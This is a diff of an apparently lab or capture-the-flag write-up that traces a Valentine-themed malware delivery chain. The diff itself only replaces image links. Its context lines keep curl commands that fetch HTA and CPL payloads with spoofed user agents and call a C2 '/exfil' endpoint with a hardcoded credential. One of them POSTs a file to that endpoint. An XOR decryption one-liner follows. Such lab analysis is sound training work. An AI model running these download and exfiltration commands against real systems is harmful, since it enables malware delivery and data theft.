@@ -3,7 +3,7 @@
 curl -L -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36" http://delivery.cupidsarrow.thm/card.html
 ```
 
-![alt text](image.png)
+<img width="1193" height="829" alt="image" src="https://github.com/user-attachments/assets/d65a22cc-6396-4866-b6a7-d03c0810faa2" />
 
 ``` BASH
 curl -O -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36" http://delivery.cupidsarrow.thm/valentine-animations.js
@@ -14,7 +14,7 @@ curl -O -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53
 curl -o love.hta -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0)" -H "Referer: http://delivery.cupidsarrow.thm/" http://ecard.rosesforyou.thm/love.hta
 ```
 
-![alt text](image-3.png)
+<img width="1184" height="621" alt="image-3" src="https://github.com/user-attachments/assets/65a709bf-739f-42e5-a1e6-4c73fe3b7c36" />
 
 ``` BASH
 curl -sS -o bthprops.cpl -H "User-Agent: certutil" -H "Accept: */*" http://gifts.bemyvalentine.thm/bthprops.cpl
@@ -106,17 +106,17 @@ Content-Length: 1313
 Content-Type: text/html
 ```
 
-![alt text](image-4.png)
+<img width="996" height="218" alt="image-4" src="https://github.com/user-attachments/assets/f0f47d05-54e9-4220-b54b-4011895a16c7" />
 
 ## C2 Infrastructure Discovery
 
-![alt text](image-5.png)
+<img width="1081" height="276" alt="image-5" src="https://github.com/user-attachments/assets/cd14949d-9153-4d8f-92d3-c5d0a2b2d343" />
 
-![alt text](image-6.png)
+<img width="967" height="309" alt="image-6" src="https://github.com/user-attachments/assets/4b20ded1-5944-473a-9da3-c431703713f5" />
 
 ## Data Exfiltration Analysis
 
-![alt text](image-7.png)
+<img width="1184" height="587" alt="image-7" src="https://github.com/user-attachments/assets/c704507d-6261-44a8-812c-cac1f2cc928f" />
 
 ``` BASH
 curl -u cupid_agent:'R0s3s4r3R3d!V10l3ts4r3Blu3#2024' http://api.valentinesforever.thm:8080/exfil/61d07abe73c3.enc -o 61d07abe73c3.enc
@@ -127,10 +127,10 @@ curl -u cupid_agent:'R0s3s4r3R3d!V10l3ts4r3Blu3#2024' http://api.valentinesforev
 curl -i -X POST -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' -H 'Content-Type: application/octet-stream' --data-binary @nulos.bin http://api.valentinesforever.thm:8080/exfil
 ```
 
-![alt text](image-8.png)
+<img width="1067" height="282" alt="image-8" src="https://github.com/user-attachments/assets/0f90c259-3963-44d6-8385-34bf113e7819" />
 
 ``` BASH
 curl -s -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' http://api.valentinesforever.thm:8080/exfil/70571de5bca6.enc -o keystream.bin && python3 -c "k=open('keystream.bin','rb').read(); f=open('61d07abe73c3.enc','rb').read(); print(''.join(chr(a^b) for a,b in zip(f,k)))"
 ```
 
-![alt text](image-9.png)
+<img width="1085" height="592" alt="image-9" src="https://github.com/user-attachments/assets/68e92ece-4902-4875-b6ae-ac9f4d85390e" />
